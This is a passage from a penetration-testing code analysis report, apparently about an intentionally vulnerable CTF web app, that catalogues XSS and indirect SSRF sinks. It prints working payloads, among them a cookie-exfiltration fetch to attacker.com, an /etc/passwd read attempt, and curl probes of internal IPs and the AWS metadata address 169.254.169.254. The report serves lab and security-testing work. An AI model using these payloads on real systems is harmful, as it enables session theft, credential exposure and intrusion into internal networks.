**Client-Side JavaScript Sinks:** NONE

Searched for common client-side XSS sinks and found:
- ❌ No `innerHTML` usage
- ❌ No `outerHTML` usage
- ❌ No `document.write()` usage
- ❌ No `document.writeln()` usage
- ❌ No `element.insertAdjacentHTML()` usage
- ❌ No `eval()` usage
- ❌ No `Function()` constructor usage
- ❌ No `setTimeout(string)` or `setInterval(string)` usage
- ❌ No jQuery sinks (`$().html()`, `$().append()`, etc.)
- ❌ No `location.href` manipulation with user input
- ❌ No `window.open()` with user input

**Reason:** Application has minimal client-side JavaScript (only static CSS and images in `/static/`)

**CSS Context Sinks:** NONE
- ❌ No `element.style` manipulation with user input
- ❌ No user input in `<style>` tags

**URL Context Sinks:** NONE
- ❌ No `location.href` manipulation
- ❌ No `location.replace()` or `location.assign()` with user input
- ❌ No `history.pushState()` or `history.replaceState()` with user input

---

### Summary Table

| Sink # | Sink Type | Location | Render Context | User Input Source | Exploitability | Network Accessible |
|--------|-----------|----------|----------------|-------------------|----------------|-------------------|
| 1 | Reflected XSS | `/src/app.py:68-70` | HTML Body | `GET /page?name=` | HIGH (Intentional) | ✓ YES |
| 2 | Stored XSS (Temp) | `/src/app.py:38-40` | Full HTML | Indirect via Sink 1 | LOW (Race condition) | ✓ YES (5s window) |
| 3 | HTML Injection | `/src/app.py:56` | HTML Body | Flag file content | THEORETICAL | ✓ YES (after XSS) |
| 4 | JS Execution | `/src/check.js:8-32` | PhantomJS | Indirect via Sink 1 | CRITICAL (Intended) | ✓ YES (server-side) |

---

### Exploitation Recommendations for Penetration Testing

**Primary Attack Path:**
```bash
# Step 1: Trigger XSS with exact "XSS" string
curl "http://localhost:5000/page?name=%3Cbody%20onload%3Dalert('XSS')%3E"

# Step 2: Observe flag disclosure in response
# Expected: HTML contains "Here is the flag: flag{...}"
```

**Alternative Payloads to Test:**
```html
<!-- Event handler variations -->
<body onfocus=alert('XSS') autofocus>
<body onpageshow=alert('XSS')>
<body onhashchange=alert('XSS')>

<!-- Confirm/Prompt (also captured by check.js) -->
<body onload=confirm('XSS')>
<body onload=prompt('XSS')>
```

**Advanced Testing (Beyond CTF Scope):**
```html
<!-- SSRF via PhantomJS (make external requests) -->
<body onload="fetch('http://attacker.com/exfil?data='+document.cookie)">

<!-- Local file read (if PhantomJS vulnerable) -->
<body onload="var xhr=new XMLHttpRequest();xhr.open('GET','file:///etc/passwd');xhr.send()">

<!-- DOM-based info gathering -->
<body onload="alert(document.domain)">
```

**Conclusion:** The primary XSS sink (Sink 1) is intentionally vulnerable and represents the main attack surface. The weak regex filter specifically allows `<body>` tags, creating a clear exploitation path for CTF completion.

---

## 10. SSRF Sinks

**SCOPE:** This section catalogs SSRF sinks in network-accessible web application components only. All findings are reachable via HTTP requests to the deployed application.

### Summary

**Direct SSRF Sinks Found:** 0 (No user-controlled URLs in server-side requests)

**Indirect SSRF Sinks Found:** 1 (PhantomJS headless browser loading user-influenced HTML)

**Exploitability:** LOW-MEDIUM (Indirect exploitation via HTML resource references)

---

### Indirect SSRF Sink: PhantomJS HTML Resource Loading

**Sink Type:** Headless Browser (PhantomJS) - Indirect SSRF  
**File Path:** `/src/check.js`  
**Line Number:** 20  
**Network Accessibility:** ✓ YES - Triggered via `GET /page?name=<payload>`

**Code Snippet:**

**JavaScript (check.js):**
```javascript
// Line 4: Read URL from stdin (provided by Python app)
var input = system.stdin.readLine();

// Line 20: PhantomJS loads the URL
page.open(input, function(status) {
    // ... page processing ...
});
```

**Python (app.py):**
```python
# Lines 34-36: Subprocess creation and URL construction
proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                        stdout=subprocess.PIPE, stdin=subprocess.PIPE)
fn = "static/" + os.urandom(16).encode('hex') + '.html'
url = 'http://localhost:5000/' + fn

# Line 43: URL passed to PhantomJS via stdin
proc.stdin.write(url)
```

**User Input Source:**
- **Direct URL Control:** ❌ NO - User cannot control the URL passed to `page.open()`
- **Indirect Content Control:** ✓ YES - User controls HTML content that PhantomJS loads
- **Parameter:** `GET /page?name=<payload>` → Embedded in HTML → Loaded by PhantomJS

**Request Destination Control:**

**URL Control:** NONE (Hardcoded)
- **Base URL:** Always `http://localhost:5000/`
- **Path:** Random 32-hex-character filename (not user-controllable)
- **User Cannot Influence:** Protocol, host, port, or path

**HTML Content Control:** FULL (After Weak Filtering)
- User input embedded in HTML (filtered by weak regex)
- PhantomJS loads and parses HTML
- HTML can reference external resources via tags/attributes

**Exploitation Mechanism:**

Since PhantomJS is a **headless browser**, it will automatically fetch resources referenced in HTML:

**Attack Vectors:**

1. **External Image Loading via body background:**
   ```html
   <body background="http://attacker.com/exfil?data=test">
   ```
   **Result:** PhantomJS makes GET request to `attacker.com`

2. **External Script Loading (Blocked by Filter):**
   ```html
   <script src="http://attacker.com/evil.js"></script>
   ```
   **Result:** ❌ BLOCKED - Regex filter removes `<script>` tags

3. **CSS Background Images (Blocked by Filter):**
   ```html
   <style>body{background:url('http://attacker.com/image.jpg')}</style>
   ```
   **Result:** ❌ BLOCKED - Regex filter removes `<style>` tags

4. **Iframe Source (Blocked by Filter):**
   ```html
   <iframe src="http://internal-network/admin"></iframe>
   ```
   **Result:** ❌ BLOCKED - Regex filter removes `<iframe>` tags

**Only Allowed HTML Tag: `<body>`**

**Regex Filter:**
```python
blacklist = r'<(?!body\b)[^>]+>'
# Removes ALL tags EXCEPT those starting with "body"
```

**Available SSRF Vectors (Limited to `<body>` tag attributes):**

| Attribute | Payload | Browser Support | PhantomJS Support | Exploitability |
|-----------|---------|-----------------|-------------------|----------------|
| `background` | `<body background="http://attacker.com/img.jpg">` | Legacy (deprecated) | ⚠️ Possible | MEDIUM |
| `style` | `<body style="background:url(...)">` | Modern | ✓ Yes | MEDIUM |

**Test Payload:**
```html
<body background="http://attacker.com/exfil?cookie=test">
```

**Expected Behavior:**
1. User sends: `GET /page?name=<body background="http://attacker.com/test">`
2. Flask creates HTML with `<body>` tag containing attacker URL
3. PhantomJS loads HTML from `localhost:5000`
4. PhantomJS parses `<body background="...">` attribute
5. PhantomJS makes HTTP GET request to `http://attacker.com/test`
6. Attacker receives request in access logs

**Exploitability Assessment:**

**Impact:** LOW-MEDIUM
- **Internal Network Scanning:** PhantomJS could probe internal IPs (e.g., `http://10.0.0.1/admin`)
- **Cloud Metadata Access:** Potential access to `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- **Credential Theft:** Limited (no cookies sent, only raw HTTP request)
- **Data Exfiltration:** Cannot exfiltrate data easily (no JavaScript execution in attacker-controlled domain)

**Limitations:**
- Only GET requests (no POST)
- Cannot control request headers
- Cannot read response content
- Limited to HTTP/HTTPS (no file://, gopher://, etc.)
- Only one attribute per `<body>` tag

**Likelihood:** MEDIUM
- Requires understanding of browser attribute behavior
- PhantomJS may or may not fetch `background` attribute resources
- More reliable with `style` attribute

**Proof of Concept:**
```bash
# Test if PhantomJS fetches background attribute URLs
curl "http://localhost:5000/page?name=%3Cbody%20background=%22http://attacker.com/ssrf-test%22%3E"

# Monitor attacker.com logs for incoming request from PhantomJS
```

---

### Direct SSRF Sinks: NOT FOUND

**HTTP(S) Clients:** NONE

Searched entire codebase for common HTTP client libraries:

```bash
# Python HTTP clients
grep -rn "import requests\|from requests\|import urllib2\|from urllib2\|import httplib\|import urllib3" /src/
# Result: No matches

# urllib (imported but never used)
grep -rn "urlopen\|urllib.request\|Request(" /src/app.py
# Result: No usage (import on line 9, never called)
```

**Finding:** `urllib` is imported in `/src/app.py` line 9, but **never used**:
```python
import urllib  # Imported but not called anywhere
```

**Other Network Libraries:** NONE
- No `socket.connect()` usage
- No `telnetlib`, `ftplib`, `smtplib` usage
- No `http.client` or `httplib2` usage

---

### Other SSRF Sink Categories: NOT FOUND

**Raw Sockets & Connect APIs:** NONE
- ❌ No `socket.connect()` usage
- ❌ No `telnetlib`, `ftplib` usage

**URL Openers & File Includes:** NONE
- ❌ No `open()` with URLs
- ❌ No `file_get_contents()` (PHP) - This is Python
- ❌ No `include()` or `require()` (not applicable to Python)

**Redirect & "Next URL" Handlers:** NONE
- ❌ No `response.redirect()` with user input
- ❌ No "return URL" or "continue to" parameters
- ❌ No redirect functionality in application

**Headless Browsers & Render Engines:** PHANTOMJS (Cataloged Above)
- ✓ PhantomJS `page.open()` - Indirect SSRF via HTML content (described above)

**Media Processors:** NONE
- ❌ No ImageMagick usage
- ❌ No FFmpeg usage
- ❌ No image processing libraries

**Link Preview & Unfurlers:** NONE
- ❌ No link preview generation
- ❌ No oEmbed fetchers
- ❌ No URL metadata extraction

**Webhook Testers & Callback Verifiers:** NONE
- ❌ No webhook testing functionality
- ❌ No callback verification endpoints

**SSO/OIDC Discovery & JWKS Fetchers:** NONE
- ❌ No OpenID Connect discovery
- ❌ No JWKS fetching
- ❌ No OAuth metadata retrieval
- ❌ No authentication infrastructure at all

**Importers & Data Loaders:** NONE
- ❌ No "import from URL" functionality
- ❌ No RSS/Atom feed readers
- ❌ No remote configuration fetchers

**Package/Plugin/Theme Installers:** NONE
- ❌ No "install from URL" features
- ❌ No package managers
- ❌ No plugin downloaders

**Monitoring & Health Check Frameworks:** NONE (Beyond Basic TCP Check)
- ❌ No URL pingers
- ❌ No uptime checkers
- ❌ No health check probes that make external requests

**Cloud Metadata Helpers:** NONE
- ❌ No AWS/GCP/Azure metadata API calls
- ❌ No cloud service discovery
- ❌ No container orchestration API clients

---

### SSRF Summary

**Direct SSRF:** NOT EXPLOITABLE
- No user-controlled URLs in server-side HTTP requests
- `urllib` imported but never used
- No HTTP client libraries invoked with user input

**Indirect SSRF:** POTENTIALLY EXPLOITABLE (LOW-MEDIUM Impact)
- PhantomJS headless browser can be coerced to fetch external resources
- Limited to `<body>` tag attributes (background, style)
- Cannot control full URL passed to `page.open()` (always `localhost:5000`)
- Can influence HTML content that references external resources

**Attack Surface Rating:** LOW (Limited SSRF via browser attribute behavior)

---

### Recommendations for Penetration Testing

**Test Payloads:**

1. **External Resource Fetch:**
   ```bash
   curl "http://localhost:5000/page?name=%3Cbody%20background=%22http://attacker.com/ssrf%22%3E"
   ```
   Monitor `attacker.com` for incoming requests.

2. **Internal Network Probing:**
   ```bash
   curl "http://localhost:5000/page?name=%3Cbody%20background=%22http://192.168.1.1/admin%22%3E"
   ```
   Check PhantomJS logs for connection attempts.

3. **Cloud Metadata Access (AWS):**
   ```bash
   curl "http://localhost:5000/page?name=%3Cbody%20background=%22http://169.254.169.254/latest/meta-data/%22%3E"
   ```
   Attempt to access AWS instance metadata.

4. **Style Attribute (More Reliable):**
   ```bash
   curl "http://localhost:5000/page?name=%3Cbody%20style=%22background:url('http://attacker.com/ssrf')%22%3E"
   ```

**Expected Results:**
- PhantomJS may or may not fetch resources from `background` attribute (browser-dependent)
- `style` attribute with `url()` more likely to trigger fetch
- Monitor network traffic or use webhook services (webhook.site) to detect outbound requests

**Note:** This SSRF is indirect and limited in scope. It cannot read response data or exfiltrate information easily. Primary impact is internal network port scanning or metadata service access.

---

**Conclusion:** No traditional SSRF sinks exist where users directly control URLs in server-side HTTP requests. The only potential SSRF vector is via PhantomJS loading HTML content that references external resources through the limited `<body>` tag attributes allowed by the filter.

---

# End of Code Analysis Report

**Report Generated:** October 30, 2025  
**Application:** XBEN-050-24 (Dalgona XSS Challenge)  
**Analysis Scope:** Network-Accessible Attack Surface  
**Primary Vulnerability:** Reflected XSS via weak regex filter (intentional)  
**Overall Risk Rating:** CRITICAL (for production), APPROPRIATE (for CTF training)

**Key Findings:**
- **0 Authentication Mechanisms** - All endpoints public
- **0 Databases** - Stateless application
- **2 Network-Accessible Endpoints** - `/` and `/page?name=`
- **1 Primary XSS Sink** - Intentionally vulnerable
- **4 XSS Sinks Total** - Including indirect sinks
- **0 Direct SSRF Sinks** - 1 indirect via PhantomJS
- **200+ Unpatched CVEs** - Python 2.7 EOL since 2020
- **Flag in Plaintext** - No encryption anywhere

**Next Steps for Penetration Testing Team:**
1. Focus on bypassing XSS filter at `/page?name=` endpoint
2. Test `<body>` tag event handler variations
3. Attempt flag disclosure via `alert("XSS")` trigger
4. Investigate PhantomJS indirect SSRF vectors
5. Test resource exhaustion (no rate limiting)
6. Examine temporary file race conditions (low priority)

**This analysis provides complete coverage of the network-accessible attack surface and establishes the technical baseline for all subsequent vulnerability analysis and exploitation phases.**